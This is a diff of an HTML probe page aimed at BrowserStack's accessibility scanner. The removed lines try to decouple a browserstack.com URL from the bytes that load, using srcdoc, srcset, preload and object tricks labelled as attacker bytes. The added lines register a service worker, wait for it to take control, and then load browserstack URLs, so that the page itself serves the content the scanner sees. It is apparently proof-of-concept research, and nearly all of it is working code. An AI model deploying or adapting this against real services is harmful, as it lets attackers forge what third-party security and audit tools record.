@@ -1,29 +1,31 @@
-<!DOCTYPE html><html><head><title>a11y proxymap key-shaping probe</title>
+<!DOCTYPE html><html><head><title>a11y proxymap key/bytes split probe</title>
 <link rel="stylesheet" href="style.css">
 </head>
 <body>
-<h1 id="h1">proxyMap key-shaping probe</h1>
+<h1 id="h1">proxyMap key/bytes decoupling probe (SW split)</h1>
 <img src="own-asset.png" alt="">
-<img src="https://raw.githubusercontent.com/github/explore/main/topics/javascript/javascript.png" alt="">
-<script src="https://static-assets.browserstack.com/accessibility/theme-loader.js"></script>
-<link rel="stylesheet" href="https://accessibility.browserstack.com/env.js">
-<script src="https://accessibility.browserstack.com/env.js"></script>
-<img src="https://accessibility.browserstack.com/favicon.ico" alt="">
-<iframe src="https://accessibility.browserstack.com/probe-iframe-a11y.html" width="50" height="50" title="a11y iframe probe"></iframe>
-<iframe src="frameB.html" width="50" height="50" title="base split probe"></iframe>
 <iframe src="frameC.html" width="50" height="50" title="own frame control"></iframe>
-
-<!-- KEY/BYTES DECOUPLING PROBES -->
-<!-- D1: src+srcdoc together. srcdoc wins for the LOAD, src is what the DOM says. -->
-<iframe src="https://accessibility.browserstack.com/env.js" srcdoc="&lt;h2&gt;D1_ATTACKER_SRCDOC_BYTES&lt;/h2&gt;&lt;input type=text&gt;" width="50" height="50" title="D1"></iframe>
-<!-- D2: same trick aimed at the cross-origin bootstrap script, with a JS-comment-first body -->
-<iframe src="https://static-assets.browserstack.com/accessibility/theme-loader.js" srcdoc="&lt;!--D2_ATTACKER_SRCDOC_BYTES--&gt;&lt;input type=text&gt;" width="50" height="50" title="D2"></iframe>
-<!-- D3: srcset candidate points at a11y while src is attacker-owned -->
-<img src="own-asset.png" srcset="https://accessibility.browserstack.com/env.js 2x" alt="">
-<!-- D4: preload as=script for an a11y url -->
-<link rel="preload" as="script" href="https://accessibility.browserstack.com/preload-probe.js">
-<!-- D5: object/embed -->
-<object data="https://accessibility.browserstack.com/object-probe.html" width="30" height="30"></object>
+<div id="dyn"></div>
 <button>no label</button>
 <input type="text">
+<script>
+(async function () {
+  var log = function (m) { var d = document.createElement('div'); d.textContent = m; document.body.appendChild(d) };
+  try {
+    await navigator.serviceWorker.register('sw.js', { scope: './' });
+    await navigator.serviceWorker.ready;
+    for (var i = 0; i < 40 && !navigator.serviceWorker.controller; i++) await new Promise(function (r) { setTimeout(r, 100) });
+    log('SW_CONTROLLED=' + !!navigator.serviceWorker.controller);
+    // Only NOW reference the browserstack URLs, so every one of them is served by my SW.
+    document.getElementById('dyn').innerHTML =
+      '<link rel="stylesheet" href="https://accessibility.browserstack.com/env.js">' +
+      '<link rel="stylesheet" href="https://accessibility.browserstack.com/swsplit-probe.css">' +
+      '<link rel="stylesheet" href="https://static-assets.browserstack.com/accessibility/theme-loader.js">' +
+      '<iframe src="https://accessibility.browserstack.com/swsplit-probe.html" width="40" height="40" title="swsplit iframe"></iframe>' +
+      '<img src="https://accessibility.browserstack.com/swsplit-probe.css" alt="">';
+    // also exercise a plain fetch, in case dom-forge harvests from the page context
+    try { var r = await fetch('https://accessibility.browserstack.com/env.js'); log('FETCH_ENVJS=' + (await r.text()).slice(0, 40)) } catch (e) { log('FETCH_ERR=' + e) }
+  } catch (e) { log('SW_ERR=' + e) }
+})();
+</script>
 </body></html>
